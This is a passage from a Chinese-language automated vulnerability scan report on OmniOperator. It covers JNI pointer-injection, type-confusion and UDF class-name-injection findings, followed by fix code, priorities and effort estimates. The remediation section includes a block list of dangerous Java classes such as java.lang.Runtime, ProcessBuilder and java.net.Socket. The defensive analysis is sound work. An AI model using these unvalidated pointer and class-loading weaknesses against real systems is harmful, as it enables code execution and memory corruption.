    jclass jClass, jlongArray vecAddrArray, jint partitionNum, jint rowCount) {
    ...
    auto vec = reinterpret_cast<omniruntime::vec::BaseVector *>(addrs[i]); // 直接转换指针
```

**达成路径**

External (Java jlongArray) -> reinterpret_cast -> BaseVector pointer array

**验证说明**: Same as VULN-DF-JNI-005: computePartitionIds pointer cast.

**评分明细**: base: 30 | controllability: 25 | context: 0 | cross_file: 0 | mitigations: 0 | reachability: 30

---

## 5. 模块漏洞分布

| 模块 | Critical | High | Medium | Low | 合计 |
|------|----------|------|--------|-----|------|
| bindings/java | 6 | 4 | 0 | 0 | 10 |
| udf | 4 | 0 | 0 | 0 | 4 |
| **合计** | **10** | **4** | **0** | **0** | **14** |

## 6. CWE 分布

| CWE | 数量 | 占比 |
|-----|------|------|
| CWE-843 | 6 | 42.9% |
| CWE-94 | 4 | 28.6% |
| CWE-787 | 4 | 28.6% |

---

## 7. 修复建议

### 7.1 JNI 指针注入漏洞修复方案

JNI 指针注入漏洞（VULN-DF-JNI-001/002/003，VULN-SEC-JNI-001/002/003）的根本原因是 JNI 入口点直接将 jlong 转换为指针，缺少验证机制。

#### 短期修复方案

1. **添加 NULL 检查和魔术字验证**

```cpp
JNIEXPORT jint JNICALL Java_nova_hetu_omniruntime_operator_OmniOperator_addInputNative(JNIEnv *env, jobject jObj,
    jlong jOperatorAddress, jlong jVecBatchAddress)
{
    // 修复 1: NULL 检查
    if (jOperatorAddress == 0 || jVecBatchAddress == 0) {
        env->ThrowNew(omniRuntimeExceptionClass, "Invalid null pointer address");
        return -1;
    }
    
    // 修复 2: 魔术字验证
    auto *vecBatch = reinterpret_cast<VectorBatch *>(jVecBatchAddress);
    if (!VectorBatch::IsValidObject(vecBatch)) {
        env->ThrowNew(omniRuntimeExceptionClass, "Invalid VectorBatch pointer");
        return -1;
    }
    
    auto *nativeOperator = reinterpret_cast<op::Operator *>(jOperatorAddress);
    if (!op::Operator::IsValidObject(nativeOperator)) {
        env->ThrowNew(omniRuntimeExceptionClass, "Invalid Operator pointer");
        return -1;
    }
    
    // 原有逻辑
    // ...
}
```

2. **实现对象魔术字**

```cpp
class Operator {
private:
    static constexpr uint32_t MAGIC = 0xDEADBEEF;
    uint32_t magic_ = MAGIC;
    
public:
    static bool IsValidObject(Operator* ptr) {
        return ptr != nullptr && ptr->magic_ == MAGIC;
    }
};
```

#### 长期修复方案

**使用安全的指针注册机制**

```cpp
// 全局 Operator 注册表
class OperatorRegistry {
private:
    static std::unordered_map<uint64_t, Operator*> operators_;
    static std::mutex mutex_;
    
public:
    // 创建时注册
    static uint64_t Register(Operator* op) {
        uint64_t id = GenerateSecureId();
        std::lock_guard<std::mutex> lock(mutex_);
        operators_[id] = op;
        return id;
    }
    
    // 验证并获取
    static Operator* Get(uint64_t id) {
        std::lock_guard<std::mutex> lock(mutex_);
        auto it = operators_.find(id);
        return (it != operators_.end()) ? it->second : nullptr;
    }
    
    // 删除时移除并释放
    static bool UnregisterAndDelete(uint64_t id) {
        std::lock_guard<std::mutex> lock(mutex_);
        auto it = operators_.find(id);
        if (it == operators_.end()) {
            return false;  // 已被删除或无效
        }
        Operator::DeleteOperator(it->second);
        operators_.erase(it);
        return true;
    }
};
```

**Java 层面使用 opaque handle 而非裸指针**

```java
public class OmniOperator {
    private long handleId;  // 注册表 ID，而非内存地址
    private boolean closed = false;
    
    public void close() {
        if (closed) {
            throw new IllegalStateException("Operator already closed");
        }
        closeNative(handleId);
        closed = true;
    }
    
    private native void closeNative(long handleId);
}
```

### 7.2 UDF 类名注入漏洞修复方案

UDF 类名注入漏洞（VULN-DF-UDF-001/002，VULN-SEC-UDF-001/002）的根本原因是 udfClass 参数未经过白名单验证直接传递给 JVM。

#### 短期修复方案

1. **白名单验证**

```cpp
void ExecuteHiveUdfSingle(int64_t contextPtr, const char *udfClass, ...)
{
    // 白名单验证
    static const std::set<std::string> allowedUdfClasses = {
        "com.example.udf.ValidUdf1",
        "com.example.udf.ValidUdf2",
    };
    
    if (!allowedUdfClasses.contains(udfClass)) {
        SetError(contextPtr, "UDF class not in whitelist: " + std::string(udfClass));
        return;
    }
    
    // 黑名单检查
    static const std::set<std::string> forbiddenClasses = {
        "java.lang.Runtime",
        "java.lang.ProcessBuilder",
        "java.lang.System",
        "java.io.File",
        "java.io.FileInputStream",
        "java.io.FileOutputStream",
        "java.net.Socket",
    };
    
    for (const auto& forbidden : forbiddenClasses) {
        if (strstr(udfClass, forbidden.c_str()) != nullptr) {
            SetError(contextPtr, "Dangerous class blocked: " + std::string(udfClass));
            return;
        }
    }
    
    // 原有逻辑
    // ...
}
```

#### 长期修复方案

**UDF 注册机制**

```cpp
class UdfRegistry {
private:
    static std::unordered_map<std::string, UdfMetadata> registeredUdfs_;
    static std::mutex mutex_;
    
public:
    static void RegisterUdf(const std::string& className, const UdfMetadata& metadata) {
        std::lock_guard<std::mutex> lock(mutex_);
        registeredUdfs_[className] = metadata;
    }
    
    static bool IsUdfAllowed(const std::string& className) {
        std::lock_guard<std::mutex> lock(mutex_);
        return registeredUdfs_.contains(className);
    }
};

// 修改后的执行函数
void ExecuteHiveUdfSingle(int64_t contextPtr, const char *udfClass, ...) {
    if (!UdfRegistry::IsUdfAllowed(udfClass)) {
        SetError(contextPtr, "UDF not registered: " + std::string(udfClass));
        return;
    }
    // 原有逻辑
}
```

**Java 层面加固**

```java
public class HiveUdfExecutor {
    private static final Set<String> FORBIDDEN_PACKAGES = Set.of(
        "java.lang", "java.io", "java.net", "java.reflect"
    );
    
    public static void executeSingle(String udfClassName, ...) {
        for (String forbidden : FORBIDDEN_PACKAGES) {
            if (udfClassName.startsWith(forbidden)) {
                throw new SecurityException("Forbidden UDF class: " + udfClassName);
            }
        }
        
        Class<?> udfClass = Class.forName(udfClassName);
        if (!UDFInterface.class.isAssignableFrom(udfClass)) {
            throw new SecurityException("Class does not implement UDF interface");
        }
        
        // 执行 UDF
    }
}
```

### 7.3 类型混淆漏洞修复方案

类型混淆漏洞（VULN-DF-JNI-004/005，VULN-DF-TYPE-001）与 JNI 指针注入类似，需要统一的验证机制。

**统一验证宏**

```cpp
#define VALIDATE_JNI_POINTER(env, ptr, type, errmsg) \
    if (ptr == 0) { \
        env->ThrowNew(omniRuntimeExceptionClass, errmsg); \
        return ERROR_INVALID_POINTER; \
    } \
    if (!type::IsValidObject(reinterpret_cast<type*>(ptr))) { \
        env->ThrowNew(omniRuntimeExceptionClass, errmsg); \
        return ERROR_INVALID_OBJECT; \
    }
```

### 7.4 修复优先级与时间估算

| 优先级 | 漏洞 | 修复方案 | 预估工时 |
|--------|------|---------|---------|
| P0 | VULN-DF-UDF-001/002 | UDF 白名单 + 注册机制 | 2-3 天 |
| P0 | VULN-SEC-UDF-001/002 | Java 层面安全检查 | 1 天 |
| P1 | VULN-DF-JNI-001/002/003 | 指针验证 + 注册表 | 3-5 天 |
| P1 | VULN-SEC-JNI-001/002/003 | 统一验证宏 | 1 天 |
| P2 | VULN-DF-JNI-004/005 | 扩展验证机制 | 1 天 |

**总预估工时**: 8-11 天

### 7.5 架构层面建议

1. **所有 JNI 入口点统一使用验证宏**
2. **实现对象魔术字机制**
3. **使用 opaque handle 替代裸指针传递**
4. **UDF 执行前强制注册验证**
5. **添加安全管理器限制 JVM 权限**

---

## 8. 附录

### 8.1 参考链接

- [CWE-843: Access of Resource Using Incompatible Type](https://cwe.mitre.org/data/definitions/843.html)
- [CWE-94: Improper Control of Generation of Code](https://cwe.mitre.org/data/definitions/94.html)
- [CWE-787: Out-of-bounds Write](https://cwe.mitre.org/data/definitions/787.html)
- [CWE-416: Use After Free](https://cwe.mitre.org/data/definitions/416.html)
- [JNI Best Practices - Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/)
- [Java Security Manager](https://docs.oracle.com/javase/8/docs/technotes/guides/security/)

### 8.2 深度分析报告索引

详细的深度分析报告位于 `scan-results/details/` 目录：

| 漏洞 ID | 深度分析文件 |
|---------|-------------|
| VULN-DF-JNI-001 / VULN-SEC-JNI-001 | VULN-DF-JNI-001.md |
| VULN-DF-JNI-002 / VULN-SEC-JNI-002 | VULN-DF-JNI-002.md |
| VULN-DF-JNI-003 / VULN-SEC-JNI-003 | VULN-DF-JNI-003.md |
| VULN-DF-UDF-001 / VULN-SEC-UDF-001 | VULN-DF-UDF-001.md |
| VULN-DF-UDF-002 / VULN-SEC-UDF-002 | VULN-DF-UDF-002.md |

---

**报告生成时间**: 2026-04-23  
**扫描引擎**: OpenCode Vulnerability Scanner  
**扫描范围**: OmniOperator 全模块
